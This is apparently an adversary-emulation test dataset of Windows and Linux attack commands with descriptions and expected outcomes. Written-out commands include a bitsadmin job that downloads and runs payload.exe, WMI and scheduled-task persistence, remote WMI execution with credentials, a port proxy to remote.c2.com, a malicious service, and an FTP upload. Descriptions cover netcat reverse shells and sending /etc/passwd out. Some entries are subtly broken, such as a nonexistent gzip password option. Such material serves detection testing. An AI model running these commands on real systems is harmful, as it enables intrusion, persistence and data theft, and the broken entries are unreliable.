attacks.description: Parse the system log to extract entries related to USB device connections, mimicking a registry query for USB history.
attacks.expected_behavior: Displays lines from /var/log/syslog that contain the string 'usb', showing timestamps and details of USB plug/unplug events.

attacks.description: Use the native lsusb tool to list detailed information about connected USB devices and filter for serial numbers.
attacks.expected_behavior: Outputs the serial numbers (if present) of all currently attached USB devices.

attacks.description: Read the 'serial' attribute from sysfs for each USB device, providing a persistent record of device identifiers.
attacks.expected_behavior: Prints the serial numbers of all USB devices that have a 'serial' attribute in the sysfs hierarchy.

attacks.command: bitsadmin /Create /Download myjob && bitsadmin /AddFile myjob http://example.com/file.txt %TEMP%\file.txt && bitsadmin /Resume myjob
attacks.description: Creates a BITS download job named 'myjob', adds a file to download from example.com, and resumes the job to fetch the file into the temporary directory.
attacks.expected_behavior: BITS service creates a background transfer job, downloads file.txt to %TEMP%\file.txt, and the job completes silently.

attacks.command: bitsadmin /Create /Download myjob && bitsadmin /AddFile myjob http://example.com/payload.exe %TEMP%\payload.exe && bitsadmin /SetNotifyCmdLine myjob cmd.exe /c start %TEMP%\payload.exe && bitsadmin /Resume myjob
attacks.description: Creates a BITS job, downloads a dummy executable, sets a notification command to launch the file after download, and starts the job.
attacks.expected_behavior: BITS downloads payload.exe to the temp folder, then automatically runs 'cmd.exe /c start %TEMP%\payload.exe' once the transfer finishes.

attacks.description: Uses PowerShell's Start-BitsTransfer cmdlet to create and run a BITS download job that retrieves a dummy payload to the temporary directory.
attacks.expected_behavior: PowerShell initiates a BITS transfer named 'stealthjob', downloads payload.exe into %TEMP%\payload.exe, and completes without user interaction.

attacks.description: Basic background download using wget, mimicking a BITS job.
attacks.expected_behavior: wget runs in the background, downloading the file to /tmp/payload.bin while the shell prompt returns immediately.

attacks.description: Intermediate background download using curl with nohup to detach from the terminal.
attacks.expected_behavior: curl runs as a detached background process, silently downloading the payload to /tmp/payload.bin.

attacks.description: Advanced transient systemd service that performs the download, resembling a BITS job managed by the init system.
attacks.expected_behavior: systemd creates a temporary service named bits-download.service which executes wget to fetch the file into /tmp/payload.bin; the service runs in the background and exits when the download completes.

attacks.command: wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name=\"StartupFilter\", Query=\"SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'\", EventNamespace=\"root\\cimv2\" && wmic /namespace:\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"StartupConsumer\", CommandLine=\"cmd.exe /c ipconfig /all > %TEMP%\\sysinfo.txt\" && wmic /namespace:\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"StartupFilter\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"StartupConsumer\\\"\"
attacks.description: Creates a WMI event filter that triggers on explorer.exe launch and a consumer that runs ipconfig, binding them for persistence.
attacks.expected_behavior: When explorer.exe starts (e.g., at user logon), the consumer runs "cmd.exe /c ipconfig /all" and writes the output to %TEMP%\sysinfo.txt.

attacks.command: powershell -Command \"$filter = Set-WmiInstance -Namespace 'root\\subscription' -Class __EventFilter -Arguments @{Name='MyFilter'; Query='SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA ''Win32_Process'' AND TargetInstance.Name = ''explorer.exe''' ; EventNamespace='root\\cimv2'}; $consumer = Set-WmiInstance -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Arguments @{Name='MyConsumer'; CommandLine='cmd.exe /c echo WMI test > %TEMP%\\wmi.txt'}; Set-WmiInstance -Namespace 'root\\subscription' -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}\"
attacks.description: Uses PowerShell's Set-WmiInstance to create a persistent WMI event filter and consumer that echo a test string to a file on explorer.exe launch.
attacks.expected_behavior: When explorer.exe starts, the consumer runs "cmd.exe /c echo WMI test" and writes the string to %TEMP%\wmi.txt.

attacks.command: wmic /namespace:\\root\\subscription PATH __IntervalTimerInstruction CREATE Name=\"StartupTimer\", Interval=60 && wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name=\"TimerFilter\", Query=\"SELECT * FROM __TimerInstruction WHERE Name = 'StartupTimer'\", EventNamespace=\"root\\cimv2\" && wmic /namespace:\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"TimerConsumer\", CommandLine=\"powershell -NoProfile -ExecutionPolicy Bypass -Command \\\"Get-Process | Out-File %TEMP%\\\\proc.txt\\\"\" && wmic /namespace:\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"TimerFilter\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"TimerConsumer\\\"\"
attacks.description: Sets up a WMI timer instruction that fires every 60 seconds, binding it to a consumer that runs a PowerShell command to list processes into a file.
attacks.expected_behavior: Every 60 seconds, the timer triggers the consumer which executes a PowerShell command that writes the list of running processes to %TEMP%\proc.txt.

attacks.command: wmic -U "admin%Password123" //192.168.1.10 "process call create \"cmd.exe /c echo WMI_Test > C:\\Temp\\wmi_test.txt\""
attacks.description: Directly executes a command on the remote Windows host via WMI to create a test file.
attacks.expected_behavior: The remote Windows system creates C:\Temp\wmi_test.txt containing the string 'WMI_Test'.

attacks.command: wmic -U "admin%Password123" //192.168.1.10 "INSERT INTO __EventFilter (Name, Query, QueryLanguage, EventNamespace) VALUES ('StartupFilter', 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_OperatingSystem\" AND TargetInstance.LastBootUpTime != NULL', 'WQL', 'root\\cimv2')"
attacks.description: Creates a persistent WMI event filter that fires on every system boot.
attacks.expected_behavior: An event filter named 'StartupFilter' is stored in the WMI repository and will trigger on each OS start.

attacks.command: wmic -U "admin%Password123" //192.168.1.10 "INSERT INTO CommandLineEventConsumer (Name, CommandLineTemplate) VALUES ('StartupConsumer', 'cmd.exe /c systeminfo > C:\\Temp\\sysinfo.txt')" && wmic -U "admin%Password123" //192.168.1.10 "INSERT INTO __FilterToConsumerBinding (Filter, Consumer) VALUES ('StartupFilter', 'StartupConsumer')"
attacks.description: Creates a command‑line consumer that runs 'systeminfo' and binds it to the startup filter, causing the command to execute on every boot.
attacks.expected_behavior: When the remote Windows machine boots, WMI triggers the consumer, executing 'systeminfo' and writing the output to C:\Temp\sysinfo.txt.

attacks.description: Basic copy of a known Office document to the temporary directory for later collection.
attacks.expected_behavior: The file example.docx is duplicated to %TEMP%\collected_example.docx if it exists; otherwise an error is shown.

attacks.command: powershell -Command "Get-ChildItem -Path $env:HOME/Documents -Filter '*.docx' -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime"
attacks.description: Lists Office .docx files in the user's Documents directory
attacks.expected_behavior: Outputs a list of .docx files in ~/Documents with their metadata. Safe and non-destructive.

attacks.command: powershell -Command "$dest = '$env:HOME/.cache/staged_data.zip'; Compress-Archive -Path $env:HOME/.cache/docs_staging/* -DestinationPath $dest -Force -ErrorAction SilentlyContinue; Write-Output "Archived files to $dest""
attacks.description: Compresses collected Office documents into a ZIP archive for potential exfiltration
attacks.expected_behavior: Creates a ZIP file containing the staged documents. Uses -Force to overwrite if archive exists. Safe as it operates within user directory and does not exfiltrate data.

attacks.description: Executes a simple PowerShell command that outputs a test string to the console.
attacks.expected_behavior: The string 'PowerShell execution test' is printed to the standard output.

attacks.description: Creates a temporary file in the user's %TEMP% directory, writes a benign string, and then reads the file content.
attacks.expected_behavior: A file named test.txt is created in %TEMP% containing 'Sample data', and its contents are displayed.

attacks.command: powershell -Command "schtasks /Create /TN AdvTask /TR \"cmd.exe /c echo Advanced > %TEMP%\\adv.txt\" /SC ONLOGON /RL HIGHEST /F"
attacks.description: Uses PowerShell to invoke schtasks.exe and create a scheduled task that writes a benign marker file at each logon.
attacks.expected_behavior: A scheduled task named 'AdvTask' is registered; on the next logon it runs cmd.exe to create %TEMP%\adv.txt containing the word 'Advanced'.

attacks.description: Basic execution: prints a test string to verify PowerShell is functional on the Linux host.
attacks.expected_behavior: The command outputs the text "Test PowerShell execution on Linux" to the console.

attacks.description: Intermediate usage: creates a temporary file in $env:TEMP, writes benign data, then reads the file contents.
attacks.expected_behavior: A file named sample.txt is created in the temporary directory containing "Sample data"; the same content is displayed on the console.

attacks.command: pwsh -Command "$temp = $env:TEMP; $dir = Join-Path $temp '.hidden'; mkdir $dir -ErrorAction SilentlyContinue; $scriptPath = Join-Path $dir 'run.sh'; Set-Content -Path $scriptPath -Value '#!/bin/bash`necho Hello from hidden script' -Force; chmod +x $scriptPath; Start-Process -FilePath $scriptPath -NoNewWindow"
attacks.description: Advanced usage: creates a hidden directory, writes a simple Bash script, makes it executable, and runs it via Start-Process.
attacks.expected_behavior: A hidden directory is created under the temp folder, a script named run.sh is written and executed, resulting in the message "Hello from hidden script" printed to the console.

attacks.description: Open the cron table for editing to schedule a new task
attacks.expected_behavior: The cron table will be opened in the default editor, allowing the user to add a new scheduled task.

attacks.description: Schedule a task to run daily at midnight, appending 'Hello World' to a log file
attacks.expected_behavior: A new log file will be created or appended to at midnight daily, containing the string 'Hello World'.

attacks.description: Schedule a task to create a new file daily at midnight, demonstrating file creation capability
attacks.expected_behavior: A new file will be created at midnight daily, demonstrating the ability to schedule file creation tasks.

attacks.description: Basic Netcat tunnel: listens on local port 1080 and forwards all traffic to remote.c2.com on port 4444 using a second Netcat instance.
attacks.expected_behavior: A listening Netcat process is started on port 1080; any connections to this port are piped to remote.c2.com:4444, effectively creating a bidirectional proxy tunnel.

attacks.command: netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=1080 connectaddress=remote.c2.com connectport=4444
attacks.description: Intermediate native proxy: uses netsh portproxy to map local port 1080 to the external C2 server remote.c2.com:4444.
attacks.expected_behavior: The system creates a TCP forwarding rule; connections to 0.0.0.0:1080 are automatically redirected to remote.c2.com:4444, providing an external proxy without additional binaries.

attacks.description: Advanced proxy using Stowaway-Node: runs the Stowaway proxy script to listen on port 1080 and forward HTTP traffic to the remote upstream server.
attacks.expected_behavior: Node launches the Stowaway proxy; local applications can connect to localhost:1080 and have their HTTP requests proxied to http://remote.c2.com:8080, establishing an external proxy tunnel.

attacks.description: Basic netcat reverse TCP tunnel to an external proxy server.
attacks.expected_behavior: Netcat attempts to connect to 203.0.113.5 on port 4444. If the remote host is listening, the TCP connection is established, creating a tunnel that can be used for proxying traffic.

attacks.description: Intermediate netcat command that binds a remote shell to the external proxy, acting as a simple command‑and‑control proxy.
attacks.expected_behavior: Netcat connects to 203.0.113.5:5555 and, upon successful connection, spawns /bin/bash whose stdin/stdout are forwarded over the socket. The remote side can issue commands through this shell, effectively using the connection as an external proxy.

attacks.description: Advanced use of Stowaway-Node to create a local SOCKS5 proxy that forwards traffic to an external HTTP proxy.
attacks.expected_behavior: Stowaway-Node starts a background process listening on localhost port 1080 (SOCKS5). All connections made to this local proxy are forwarded to the external proxy at 203.0.113.5:3128, establishing an external proxy tunnel for C2 traffic.

attacks.description: Uses certutil to download a test file over HTTPS and store it in the temporary directory.
attacks.expected_behavior: certutil connects to example.com via HTTPS, retrieves test.txt, writes it to %TEMP%\test.txt, and outputs a success message.

attacks.description: Creates a BITS transfer job to download a binary payload over HTTPS and saves it to the temporary folder.
attacks.expected_behavior: BITS initiates a download job, retrieves payload.bin from example.com, stores it at %TEMP%\payload.bin, and reports job completion.

attacks.description: PowerShell command that fetches a JSON file via HTTPS and writes it to the temp directory, then logs a confirmation message.
attacks.expected_behavior: PowerShell performs an HTTPS GET request to example.com, saves the response as %TEMP%\data.json, and outputs a message indicating the file location.

attacks.description: Download a file from a web server using curl
attacks.expected_behavior: The command downloads a file named 'malware' from 'http://example.com/malware' and saves it to '/tmp/malware'

attacks.description: Exfiltrate data by downloading it from a web server using wget
attacks.expected_behavior: The command downloads data from 'http://example.com/data' and saves it to '/tmp/exfiltrated_data'

attacks.description: Exfiltrate data by sending it to a web server using curl
attacks.expected_behavior: The command sends the string 'exfiltrated_data' to 'http://example.com/upload' via a POST request

attacks.description: Basic side‑loading: creates a dummy DLL in the TEMP folder and loads it with rundll32.exe, demonstrating that a legitimate loader can execute a malicious DLL placed by the attacker.
attacks.expected_behavior: The dummy DLL is decoded and then passed to rundll32.exe, which attempts to load the DLL and call the EntryPoint export. No real payload is executed.

attacks.command: mkdir "%TEMP%\svcdir" && copy "C:\Windows\System32\cmd.exe" "%TEMP%\svcdir\cmd.exe" && echo TVq... > "%TEMP%\svcdir\malicious.b64" && certutil -decode "%TEMP%\svcdir\malicious.b64" "%TEMP%\svcdir\malicious.dll" && sc create EvilSideLoad binPath= "%TEMP%\svcdir\cmd.exe" start= auto && sc start EvilSideLoad
attacks.description: Advanced side‑loading: copies a legitimate binary (cmd.exe) to a custom folder, drops a dummy malicious DLL alongside it, creates a Windows service that runs the copied binary, and starts the service. This forces the legitimate binary to load the DLL from its own directory, illustrating a more stealthy side‑loading approach.
attacks.expected_behavior: The service starts cmd.exe from the temporary directory; during initialization cmd.exe attempts to load supporting DLLs from the same folder, causing the dummy malicious.dll to be loaded. No real malicious activity occurs.

attacks.description: Execute whoami with a benign library preloaded via LD_PRELOAD
attacks.expected_behavior: The whoami binary loads the specified library from /tmp, demonstrating DLL side-loading via environment variable manipulation.

attacks.description: Use LD_LIBRARY_PATH to load a library from a custom directory when executing the file command
attacks.expected_behavior: The file binary loads libz from /tmp/mylibs, demonstrating library search path hijacking for execution flow control.

attacks.description: Replace system OpenSSL library with a benign one and execute openssl
attacks.expected_behavior: Openssl loads the replaced library from /usr/lib, demonstrating privileged DLL replacement for execution flow hijacking.

attacks.description: Basic netcat tunnel: listens on local port 1080 and forwards all traffic to the internal proxy at internal-proxy.example.com:8080.
attacks.expected_behavior: A TCP listener is created on port 1080; any connection to this port is proxied to the remote internal proxy, demonstrating an internal proxy tunnel.

attacks.description: Intermediate Stowaway-Node proxy: starts the Stowaway-Node binary to listen on all interfaces at port 1080 and forward traffic to the internal proxy.
attacks.expected_behavior: The Stowaway-Node process runs in the background, establishing a persistent tunnel that forwards inbound connections on port 1080 to the internal proxy server.

attacks.description: Advanced chained tunnel: uses netcat with elevated privileges to bind to privileged DNS port 53 and executes Stowaway-Node to create a secondary forward to the internal proxy.
attacks.expected_behavior: A privileged listener on port 53 is created; incoming DNS‑like traffic is handed off to Stowaway-Node, which then forwards it to the internal proxy, providing a stealthier internal tunnel.

attacks.description: Sends a crafted GET request to the Exchange OWA endpoint with the X-BEResource header to trigger CVE-2021-26855 server‑side request forgery.
attacks.expected_behavior: The request is transmitted; if the target Exchange server is vulnerable, it will process the malicious header, potentially allowing further actions. No local changes are made.

attacks.description: Downloads a benign file using certutil, simulating post‑exploitation retrieval of a web shell after exploiting CVE-2021-26855.
attacks.expected_behavior: The file benign.txt is saved to the temporary directory; the command does not execute the file.

attacks.command: sc create EvilService binPath= "cmd.exe /c powershell -Command \"Start-Process -FilePath %TEMP%\\benign.txt -WindowStyle Hidden\"" start= auto
attacks.description: Creates a Windows service that runs a hidden PowerShell command to execute the previously downloaded file, demonstrating persistence after the initial Exchange exploit.
attacks.expected_behavior: A new service named EvilService is registered; when started, it will launch the benign.txt file silently. This simulates a persistence mechanism without causing harmful effects.

attacks.description: Basic exploit attempt using curl to access a potentially vulnerable endpoint
attacks.expected_behavior: The command should trigger a detection rule for exploiting a public-facing application without causing actual harm.

attacks.description: Intermediate exploit attempt using curl to send a POST request with a JSON payload to a potentially vulnerable endpoint
attacks.expected_behavior: The command should trigger a detection rule for exploiting a public-facing application with a payload, without causing actual harm.

attacks.description: Advanced exploit attempt using curl to access a potentially vulnerable endpoint with a specific User-Agent and query parameter
attacks.expected_behavior: The command should trigger a detection rule for exploiting a public-facing application with specific headers and query parameters, without causing actual harm.

attacks.description: Basic NetBIOS name scan using nbtscan against a single target IP.
attacks.expected_behavior: Outputs a list of NetBIOS names and associated IP/MAC information discovered on the target host.

attacks.description: Intermediate enumeration using enum4linux to gather NetBIOS, SMB shares, and user information.
attacks.expected_behavior: Displays NetBIOS name tables, shared resources, user accounts, and other SMB‑related details from the target.

attacks.description: Advanced NetBIOS service discovery using nmap's nbstat NSE script on the SMB ports.
attacks.expected_behavior: Runs the nbstat NSE script, returning NetBIOS name tables, workgroup/domain information, and MAC addresses for the target.

attacks.description: Basic enumeration of the System32 directory using the built‑in cmd.exe binary.
attacks.expected_behavior: Displays a list of files and subfolders in C:\Windows\System32 on the console.

attacks.description: Intermediate enumeration of the current user's Documents folder using an environment variable.
attacks.expected_behavior: Outputs the names, sizes, and timestamps of items in the user's Documents directory.

attacks.description: Advanced enumeration of the temporary directory, including hidden and system files, and shows selected attributes.
attacks.expected_behavior: Lists each file in the %TEMP% folder with its name, size, and attribute flags, printed to the console.

attacks.description: Basic directory listing of common locations
attacks.expected_behavior: Lists files and directories in /tmp, /home, and /var/log with detailed attributes

attacks.description: Intermediate search for configuration files in /etc
attacks.expected_behavior: Finds and lists all .conf files in /etc directory with permissions

attacks.description: Advanced listing of restricted directories
attacks.expected_behavior: Lists contents of protected /root and /var/log directories using elevated privileges

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Creates a ZIP archive of all files in a temporary 'Collected' folder using the built‑in Compress-Archive cmdlet.
attacks.expected_behavior: A file named archive.zip is created in the %TEMP% directory containing copies of the test files.

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Uses .NET compression via PowerShell to archive the temporary 'Collected' directory into a ZIP file.
attacks.expected_behavior: A ZIP file named collected.zip appears in %TEMP% containing the files from the test collection folder.

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Creates a password‑protected RAR archive of the temporary 'Collected' folder using WinRAR's rar.exe utility.
attacks.expected_behavior: A RAR file named secret.rar is created in %TEMP% that requires the password 'P@ssw0rd123' to extract.

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Create a password-protected RAR archive containing a single system file.
attacks.expected_behavior: A file named /tmp/basic_archive.rar is created. The archive is encrypted with the password 'Secret123' and contains the /etc/hosts file.

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.command: mkdir -p /tmp/collect && echo 'sample data' > /tmp/collect/file1.txt && echo 'more data' > /tmp/collect/file2.log && rar a -hpStrongPass! -m5 /tmp/intermediate_archive.rar /tmp/collect/*
attacks.description: Archive multiple files from a temporary collection directory using header encryption and maximum compression.
attacks.expected_behavior: Creates /tmp/intermediate_archive.rar encrypted with password 'StrongPass!'. The archive includes file1.txt and file2.log, compressed at the highest level.

attacks.description: Basic usage of certutil to download a benign executable to the temporary folder.
attacks.expected_behavior: certutil contacts example.com, writes the file to %TEMP%\benign.exe, and exits with a success message.

attacks.description: Intermediate example: download with certutil then launch the downloaded executable using the signed start command (via cmd.exe).
attacks.expected_behavior: The file is downloaded to %TEMP%\benign.exe and then executed; a new process window may appear briefly.

attacks.description: Advanced example: download a benign DLL with certutil and execute it via the signed rundll32.exe binary, demonstrating proxy execution through a second signed binary.
attacks.expected_behavior: certutil saves the DLL to %TEMP%\benign.dll; rundll32.exe attempts to call the exported function EntryPoint (which does nothing in the benign test DLL).

attacks.description: Basic use of the signed binary curl to download a payload to /tmp, make it executable, and run it.
attacks.expected_behavior: The file is fetched from the URL, saved as /tmp/payload.bin, marked executable, and then executed, producing any output the payload generates.

attacks.description: Intermediate use of the signed binary wget to retrieve a script into a user-writable cache directory and execute it with sh.
attacks.expected_behavior: The script is downloaded silently, made executable, and run via the sh interpreter, displaying any script output.

attacks.description: Advanced execution where curl is invoked inside a transient systemd user service, demonstrating proxy execution via a signed binary within a service context.
attacks.expected_behavior: systemd creates a temporary user service that runs the curl command to download the payload, sets the executable bit, and runs it; any output appears in the service's journal.

attacks.description: Basic exfiltration: reads a test file from %TEMP% and posts its contents to a local HTTP listener acting as the C2 server.
attacks.expected_behavior: The PowerShell command sends the file data via an HTTP POST request to http://127.0.0.1:8080/upload; a listening server would receive the file contents.

attacks.description: Intermediate exfiltration: uses the built‑in bitsadmin utility to upload the test file to the same HTTP endpoint used as the C2 channel.
attacks.expected_behavior: BITS creates a transfer job named uploadJob and uploads %TEMP%\test.txt to http://127.0.0.1:8080/upload; the server receives the file.

attacks.command: cmd.exe /c "echo open 127.0.0.1> %TEMP%\\ftpscript.txt && echo user anonymous>> %TEMP%\\ftpscript.txt && echo binary>> %TEMP%\\ftpscript.txt && echo put %TEMP%\\test.txt>> %TEMP%\\ftpscript.txt && echo quit>> %TEMP%\\ftpscript.txt && ftp -s:%TEMP%\\ftpscript.txt 127.0.0.1"
attacks.description: Advanced exfiltration: creates an FTP script on the fly and runs the native ftp client to transfer the test file to an FTP server acting as the C2 channel.
attacks.expected_behavior: The command writes FTP commands to %TEMP%\ftpscript.txt and then invokes ftp -s:script to connect to 127.0.0.1, log in anonymously, and upload %TEMP%\test.txt; the FTP server receives the file.

attacks.description: Basic exfiltration: streams the content of /etc/hostname to the attacker‑controlled host via netcat.
attacks.expected_behavior: The hostname string is transmitted over a TCP connection to 10.0.0.5 on port 4444.

attacks.description: Intermediate exfiltration: compresses syslog and passwd into a tar.gz stream and sends it via netcat.
attacks.expected_behavior: A compressed archive containing the selected files is streamed to the remote listener at 10.0.0.5:4444.

attacks.description: Advanced exfiltration: encrypts the user's public SSH key with AES‑256‑CBC and transmits the ciphertext over netcat.
attacks.expected_behavior: The encrypted public key data is sent to the attacker’s host on port 4444, providing confidentiality during exfiltration.

attacks.command: powershell -Command "Set-Content -Path \"$env:TEMP\\data.txt\" -Value 'Test data for exfiltration' -Encoding ASCII; compact /c \"$env:TEMP\\data.txt\" > $null; certutil -encode \"$env:TEMP\\data.txt\" \"$env:TEMP\\data.b64\""
attacks.description: Creates a plain‑text file, compresses it in‑place with the built‑in compact utility, then encodes the compressed file to Base64 using certutil, producing a .b64 file that can be exfiltrated.
attacks.expected_behavior: A file data.txt is created in %TEMP%, compressed, and a Base64‑encoded version data.b64 appears in the same directory.

attacks.command: powershell -Command "mkdir \"$env:TEMP\\exfil\" -ErrorAction SilentlyContinue; Set-Content -Path \"$env:TEMP\\exfil\\secret.txt\" -Value 'Sensitive info' -Encoding ASCII; Compress-Archive -Path \"$env:TEMP\\exfil\\secret.txt\" -DestinationPath \"$env:TEMP\\exfil\\secret.zip\" -Force; cipher /e \"$env:TEMP\\exfil\\secret.zip\""
attacks.description: Creates a temporary folder, writes a file with sensitive data, compresses it into a ZIP archive, and then encrypts the ZIP using EFS (cipher /e), which effectively protects the archive with the user's credentials (simulating a password).
attacks.expected_behavior: A ZIP file secret.zip is created in %TEMP%\exfil and then encrypted with EFS; the file remains accessible only to the current user.

attacks.command: powershell -Command "$pwd='P@ssw0rd!'; $key = (1..16 | ForEach-Object { [byte][char]$pwd[($_-1) % $pwd.Length] }); $zipPath = \"$env:TEMP\\exfil\\secret.zip\"; $bytes = Get-Content -Path $zipPath -Encoding Byte; $b64 = [System.Convert]::ToBase64String($bytes); $secure = ConvertTo-SecureString -String $b64 -AsPlainText -Force; $enc = $secure | ConvertFrom-SecureString -Key $key; Set-Content -Path \"$env:TEMP\\exfil\\secret.enc\" -Value $enc -Encoding ASCII"
attacks.description: Reads the previously created ZIP archive, converts its binary content to a Base64 string, then encrypts that string with a password‑derived key using ConvertTo‑SecureString/ConvertFrom‑SecureString, resulting in a password‑protected .enc file.
attacks.expected_behavior: An encrypted file secret.enc appears in %TEMP%\exfil; the file contains the Base64‑encoded ZIP encrypted with the supplied password.

attacks.command: echo 'Hello World' | gzip -c > encoded_data.gz; base64 encoded_data.gz > encoded_data.base64
attacks.description: Basic example of encoding data using gzip and base64
attacks.expected_behavior: The command will create a gzip compressed file and then encode it using base64, resulting in a base64 encoded string.

attacks.command: echo 'Hello World' | gzip -c - > encoded_data.gz; base64 encoded_data.gz > encoded_data.base64; rm encoded_data.gz
attacks.description: Intermediate example of encoding data using gzip and base64, with cleanup
attacks.expected_behavior: The command will create a gzip compressed file, encode it using base64, and then remove the original compressed file.

attacks.command: echo 'Hello World' | gzip -c --password-pass='mysecretpassword' > encoded_data.gz; base64 encoded_data.gz > encoded_data.base64
attacks.description: Advanced example of encoding data using gzip with a password and base64
attacks.expected_behavior: The command will create a gzip compressed file with a password, and then encode it using base64, resulting in a base64 encoded string.

attacks.description: Basic user execution: creates a harmless script and a .desktop shortcut, then uses xdg-open (a legitimate file opener) to launch the shortcut, which runs the script.
attacks.expected_behavior: The payload script prints 'Payload executed' to the terminal; xdg-open opens the .desktop file, causing the script to run.

attacks.command:
mkdir -p "$HOME/Desktop" && echo "#!/bin/bash
echo 'Advanced payload executed'" > "$HOME/Desktop/payload.sh" && chmod +x "$HOME/Desktop/payload.sh" && echo -e "[Desktop Entry]
Type=Application
Exec=$HOME/Desktop/payload.sh
Name=System Update" > "$HOME/Desktop/payload.desktop" && gio open "$HOME/Desktop/payload.desktop"
attacks.description: Intermediate user execution: places a script and a .desktop file on the user's Desktop and uses gio (a standard GNOME utility) to open the shortcut, mimicking a user double‑click.
attacks.expected_behavior: When gio opens the .desktop file, the script runs and outputs 'Advanced payload executed' to the terminal.

attacks.description: Advanced user execution: uses systemd-run, a legitimate systemd user tool, to start the payload as a transient user service, demonstrating execution without visible terminal interaction.
attacks.expected_behavior: systemd creates a user service named bgmalware that runs the script; the script prints 'Background payload executed' to the journal, viewable via 'journalctl --user -u bgmalware'.

attacks.description: Downloads a file from a remote server using certutil and saves it to the temporary directory.
attacks.expected_behavior: The file tool.exe is retrieved from the URL and written to %TEMP%\tool.exe.

attacks.description: Uses bitsadmin to download a remote file to %TEMP% and then launches it with the start command.
attacks.expected_behavior: The file tool.exe is downloaded to %TEMP% and subsequently executed.

attacks.description: PowerShell command that fetches a file via Invoke-WebRequest and runs it silently.
attacks.expected_behavior: The tool.exe file is downloaded to the temporary directory and executed without showing a window.

attacks.description: Basic download using curl; fetches a test payload and writes it to /tmp.
attacks.expected_behavior: The file /tmp/payload.bin is created containing the data from the URL.

attacks.description: Intermediate download using wget with quiet output; saves the payload to /tmp.
attacks.expected_behavior: The file /tmp/payload.bin is created with the content retrieved from the remote server.

attacks.description: Advanced download using a Bash /dev/tcp socket to manually perform an HTTP GET and write the response to /tmp.
attacks.expected_behavior: A raw HTTP request is sent; the response body is saved as /tmp/payload.bin.

attacks.description: Collects any Office documents in the current directory and creates a zip archive in /tmp for later exfiltration.
attacks.expected_behavior: A file named /tmp/docs.zip is created containing any .doc, .docx, or .xlsx files found; no output is shown on success.

attacks.description: Creates a compressed tar stream of Office documents, encodes it with base64, and writes the result to a temporary file.
attacks.expected_behavior: A base64‑encoded representation of the archived Office files is stored at /tmp/exfil.b64; the command produces no console output.

attacks.description: Archives Office documents into a zip file and immediately posts the file to a remote HTTP endpoint, automating exfiltration.
attacks.expected_behavior: The zip archive is created silently, then curl sends it via an HTTP POST request to the specified server; curl prints the server response.

attacks.description: Compress a single test file into a ZIP archive using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: Creates sample.zip in the %TEMP% directory containing sample.txt.

attacks.description: Archive all .log files in the temporary directory into a gzip‑compressed tarball using the built‑in tar utility.
attacks.expected_behavior: Creates collected_logs.tar.gz in %TEMP% containing any .log files present.

attacks.command: powershell -Command "$src = Join-Path $env:TEMP 'SensitiveData'; $dst = Join-Path $env:TEMP 'SensitiveData.zip'; if (-Not (Test-Path $src)) { New-Item -ItemType Directory -Path $src -Force | Out-Null; Set-Content -Path (Join-Path $src 'secret.txt') -Value 'Test secret data' -Force }; Compress-Archive -Path (Join-Path $src '*') -DestinationPath $dst -Force; cipher /e $dst"
attacks.description: Create a directory with test data, archive the entire directory into a ZIP file, and then encrypt the archive using the built‑in cipher utility.
attacks.expected_behavior: Generates SensitiveData.zip in %TEMP%, containing secret.txt, and marks the ZIP file as encrypted (EFS) for the current user.

attacks.description: Basic archiving of a user‑specific directory using tar.
attacks.expected_behavior: Creates /tmp/collected_data.tar containing the contents of $HOME/Documents.

attacks.description: Intermediate archiving with zip, recursively adding log files and protecting the archive with a password.
attacks.expected_behavior: Creates /tmp/collected_logs.zip containing all .log files from /var/log, encrypted with the password "P@ssw0rd".

attacks.description: Advanced archiving: compress selected system files, exclude temporary files, then split the archive into 1 MiB chunks for staged exfiltration.
attacks.expected_behavior: Produces /tmp/collected_system.tgz (a gzipped tarball) and multiple split parts named /tmp/collected_system.part_aa, /tmp/collected_system.part_ab, etc.

attacks.description: Uses the built‑in tasklist utility to list all processes with their window titles, outputting CSV to a temporary file.
attacks.expected_behavior: Creates a CSV file in the TEMP directory containing columns for Image Name, PID, Session Name, Session#, Mem Usage, Status, User Name, CPU Time, Window Title. The Window Title column reveals titles of visible application windows.

attacks.command: powershell -NoProfile -Command "Get-Process | Where-Object { \$_.MainWindowTitle } | Select-Object Id, ProcessName, MainWindowTitle"
attacks.description: PowerShell command that filters processes with a non‑empty MainWindowTitle and displays their PID, name, and window title.
attacks.expected_behavior: Outputs a list to the console showing each process that has an associated window, including its ID, executable name, and the visible window title.

attacks.description: Uses the Shell.Application COM object to enumerate open shell windows (Explorer, IE) and prints each window's document title.
attacks.expected_behavior: Lists the titles of all open Explorer/Internet Explorer windows in the console, providing insight into user‑visible application windows.

attacks.description: Basic enumeration of all open X windows using wmctrl.
attacks.expected_behavior: Outputs a list of window IDs, desktop numbers, and window titles for each open GUI application.

attacks.command: for win in $(xprop -root _NET_CLIENT_LIST | cut -d# -f2 | tr -d ','); do xprop -id $win WM_NAME; done
attacks.description: Intermediate discovery using xprop to retrieve the list of client window IDs and then query each window's name.
attacks.expected_behavior: Iterates over each window ID and prints the WM_NAME property, showing the title of every open window.

attacks.command: xdotool search --all --name ".*" | while read id; do echo "Window ID: $id"; xdotool getwindowname $id; xdotool getwindowgeometry $id; done
attacks.description: Advanced discovery using xdotool to find all windows, then retrieve each window's name and geometry.
